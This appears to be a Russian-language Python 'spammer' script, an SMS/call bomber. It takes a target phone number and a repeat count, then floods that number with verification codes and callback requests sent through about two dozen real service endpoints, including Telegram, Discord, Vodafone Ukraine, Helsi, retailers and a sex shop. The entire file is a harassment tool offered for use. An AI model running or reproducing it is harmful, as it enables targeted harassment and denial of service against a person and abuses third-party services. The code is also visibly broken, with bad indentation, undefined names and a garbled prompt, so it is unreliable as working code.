#Библиотеки
import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#Обозначение
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
console.print('''[bold red]
 -----------------------------------------
| Создатель - Hironotori                  |
| Telegram - @Hironotori                  |
| Человек которий сильно помог - @GGClubbb|
 -----------------------------------------
''')
NUMBER = input('[green]Beeante HOMeP tenedona: (бes + ')



run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))
for _ in track(range(run)):
try:
        print('telegram')
        requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
except:
        print('Не отправлено (telegram)')
try:
        print('discord')
        requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers)
except:
        print('Не отправлено (discord)')
try:
        print('vodafone')
        requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers)
except:
        print('Не отправлено (vodafone)')
try:
        print('megasport')
        requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+" + number}, headers=headers)
except:
        print('Не отправлено (megasport)')
try:
        print('zolotakoroleva')
        requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers)
except:
        print('Не отправлено (zolotakoroleva)')
try:
        print('mozayka')
        requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers)
except:
        print('Не отправлено (mozayka)')
try:
        print('kazan-divan')
        requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers)
except:
        print('Не отправлено (kazan-divan)')
try:
        print('x100ecommerce')
        requests.post("https://x100ecommerce-api-customers.azurewebsites.net/v1/SendCode", json={"recipient": "+" + number, "retailNetworkId": "4C25DB70-1DCE-11EB-A6EC-7B643829D650", "source": "WEB"}, headers=headers)
except:
        print('Не отправлено (x100ecommerce)')
try:
        print('xtra.tv')
        requests.post("https://my.xtra.tv/api/signup?lang=uk", data={"phone": "+" + number}, headers=headers)
except:
        print('Не доставлено (xtra.tv)')
try:
        print('xtra.tv-pass')
        requests.post('https://my.xtra.tv/api/password/restore?lang=uk', data={'phone': "+" + NUMBER}, headers=headers)
except:
        print('Не доставлено (xtra.tv-pass)')
try:
        print('multiplex')
        requests.post("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers)
except:
        print('Не доставлено (multiplex)')
try:
        print('passport.aitu')
        requests.post("https://passport.aitu.io/api/v1/sms/request-code", json={"phone": "+" + number}, headers=headers)
except:
        print('Не доставлено (passport.aitu)')
try:
        print('helsi')
        requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers)
except:
        print('Не отправлено (helsi)')
try:
        print('ukrzoloto')
        requests.post("https://ukrzoloto.ua/mobile/v1/auth/phone", json={"data": {"telephoneNumber": number}}, headers=headers)
except:
        print('Не отправлено (ukrzoloto)')
try:
        print('prosto')
        requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "check-phone", "phone": "+" + number, "username": "Руслан", "_nonce": "db4f28b9da"}, headers=headers)
except:
        print('Не отправлено (prosto)')
try:
        print('bi.ua')
        requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "Сергей", "phone": number, "stage": "1"}, headers=headers)
except:
        print('Не отправлено (bi.ua)')
try:
        print('groshivsim')
        requests.post("https://admin1.groshivsim.com/api/sms/phone-verification/create", json={"phone": number}, headers=headers)
except:
        print('Не отправлено (groshivsim)')
try:
        print('money4you')
        requests.post("https://money4you.ua/api/clientRegistration/sendValidationSms", json={"fathersName": "Витальевич", "firstName": "Виталий", "lastName": "Соколов", "phone": "+" + number, "udriveEmployee": "false"}, headers=headers)
except:
        print('Не отправлено (money4you)')
try:
        print('hungrygator')
        requests.post("https://api.01.hungrygator.ru/web/auth/webotp", json={"fu": "tralala", "userLogin": "+" + number}, headers=headers)
except:
        print('Не отправлено (hungrygator)')
try:
        print('sex-shop')
        requests.post("https://sex-shop.ua/bitrix/components/bxmaker/authuserphone.login/ajax.php", data={"parameters": "YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.886837943a18715db75ae7fe96ae97183ca0be0637a0bc22ca3ba8d04e55b81f", "template": ".default.0439327cbb51aa71d187d378db240bf43d3133d2e235a6d74509561d345ec422", "siteId": "s1", "sessid": "48add65add0e6c591d7aae265c20b0db", "method": "sendCode", "phone": "+" + number, "regustration": "Y"}, headers=headers)
except:
        print('Не отправлено (sex-shop)')
try:
        print('telephony')
        requests.post("https://telephony.jivosite.com/api/1/sites/900909/widgets/OVHsL3W8hY/clients/17314/telephony/callback", data={"phone": number, "invitation_text": ""}, headers=headers)
except:
        print('Не отправлено (telephony)')
try:
        print('proxy')
        requests.post("https://api-proxy.choco.kz/user/v2/code", data={"login": number, "client_id": "-5", "dispatch_type": "call"}, headers=headers)
except:
        print('Не отправлено (proxy)')
